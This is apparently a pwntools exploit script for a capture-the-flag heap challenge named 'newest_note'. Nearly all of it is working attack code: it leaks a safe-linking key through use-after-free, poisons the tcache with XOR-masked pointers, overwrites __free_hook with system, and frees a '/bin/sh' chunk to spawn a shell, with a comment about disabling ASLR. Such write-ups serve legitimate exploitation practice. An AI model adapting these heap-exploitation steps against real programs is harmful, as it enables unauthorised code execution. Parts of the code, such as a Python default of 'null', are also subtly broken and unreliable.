# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './newest_note'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    # p = process(['./ld-linux-x86-64.so.2', binary], env = {'LD_PRELOAD':'./libc.so.6'})
    p = process(binary)
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(idx , text = 'a'):
    cmd(1)
    sla('Index:' , idx)
    sa('Content:' , text)

def show(idx ):
    cmd(3)
    sla('Index:' , idx)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)
    
    
def attack():
    
    sla('be? :' , 0x50)
    
    add(11)
    for i in range(7):
        add(12)
    for i in range(10):
        add(i)
    
    delete(11)
    show(11)
    ru('Content: ')
    key = uu64(5)
    
    heap_addr = key << 12
    lg('heap_addr' , heap_addr)
    delete(8)
    for i in range(2,8):
        delete(i)  # 7
    
    add(10)
    delete(7)
    
    first_chunk = heap_addr + 0x530
    tmp_chunk = heap_addr + 0x870
    
    add(0 , p64(key^(tmp_chunk+0x10)))
    
    for i in range(1,5):
        add(i , flat(
            key^(first_chunk),0,
            key^(tmp_chunk - 0x10),0,
            key^(tmp_chunk),
        ))
    add(5 , 'a'*0x20 + flat(0x420,0x51))
    add(6 , flat(0, 0x421,key , 0))
    add(7)
    add(8 ,  '\x40')
    delete(8)
    show(8)

    # libc.address = l64() - (0x7f84e0cadcc0 - 0x7f84e0abb000) - 0x26000
    
    libc.address = 0x7ffff7dd5000
    ogg = libc.address + 0xeeccc
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    
    lg('__free_hook' , __free_hook)
    
    # echo 0 >/proc/sys/kernel/randomize_va_space
    
    pld = flat([
        'a' * 0x10,
        key^__free_hook,
    ])
    
    # dbg()
    add(0 , pld)
    add(1, '/bin/sh\x00')
    add(0 , flat(system_addr , system_addr))
    delete(1)
    # cmd(4)
    # dbg()
    
    
    
    ''
    p.interactive()



attack()
